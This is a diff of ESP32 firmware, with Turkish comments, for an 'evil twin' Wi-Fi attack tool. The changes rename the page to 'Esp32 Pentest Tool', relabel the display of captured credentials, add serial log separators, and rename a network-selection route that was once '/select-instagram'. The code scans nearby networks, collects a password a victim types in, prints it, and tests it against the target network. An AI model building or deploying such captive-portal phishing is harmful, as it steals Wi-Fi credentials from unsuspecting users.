@@ -173,7 +173,7 @@ void handleRoot() {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Modern 4 Butonlu Menü</title>
+    <title>Esp32 Pentest Tool</title>
     <style>
         /* Genel Stil */
         body {
@@ -259,7 +259,7 @@ void handleRoot() {
   if (targetSSID != "" && savedPassword != "") {
     html += R"=====(
   <div class="credentials">
-    <div class="credential-title">WiFi Wifi</div>
+    <div class="credential-title">Ewil Twin Wifi</div>
     <p>WiFi: )=====";
     html += targetSSID;
     html += R"=====(</p>
@@ -1080,15 +1080,18 @@ void handleUpdateWifi() {
   
   Serial.println("---------------------------");
   Serial.println("Şifre doğrulanıyor...");
+  Serial.println("---------------------------");
   Serial.print("Hedef SSID: ");
   Serial.println(targetSSID);
   Serial.print("Girilen Şifre: ");
   Serial.println(password);
+  Serial.println("---------------------------");
 
  
   WiFi.mode(WIFI_AP_STA); 
-  
+  Serial.println("---------------------------");
   Serial.println("Bağlantı deneniyor...");
+  Serial.println("---------------------------");
   WiFi.begin(targetSSID.c_str(), password.c_str());
 
   unsigned long startTime = millis();
@@ -1143,8 +1146,7 @@ void handleUpdateWifi() {
 
 
 void handleEvilTwin() {
-  scanNetworks(); 
-  
+  scanNetworks();
 String html = R"=====(
 <!DOCTYPE html>
 <html lang='tr'>
@@ -1272,14 +1274,13 @@ String html = R"=====(
     </thead>
     <tbody>
 )=====";
-
   for(int i = 0; i < networkCount; i++) {
     html += "<tr>";
     html += "<td>" + String(i+1) + "</td>";
     html += "<td>" + networks[i].ssid + "</td>";
     html += "<td>" + networks[i].bssid + "</td>";
     html += "<td>" + String(networks[i].channel) + "</td>";
-    html += "<td><button onclick=\"location.href='/select-instagram?ssid=" + networks[i].ssid + "&bssid=" + networks[i].bssid + "'\">Seç</button></td>";
+    html += "<td><button onclick=\"location.href='/select-network?ssid=" + networks[i].ssid + "&bssid=" + networks[i].bssid + "'\">Seç</button></td>";
     html += "</tr>";
   }
 
